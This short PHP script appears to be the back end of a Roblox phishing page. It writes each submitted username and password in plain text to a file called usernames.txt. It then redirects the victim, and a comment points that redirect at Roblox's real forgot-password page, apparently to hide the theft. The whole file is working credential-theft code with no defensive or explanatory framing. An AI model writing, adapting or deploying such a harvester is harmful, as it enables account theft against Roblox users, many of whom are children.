<?php
file_put_contents("usernames.txt", "Roblox Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] ."\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.roblox.com/login/forgot-password-or-username
header("Location: $url");
exit();
?>
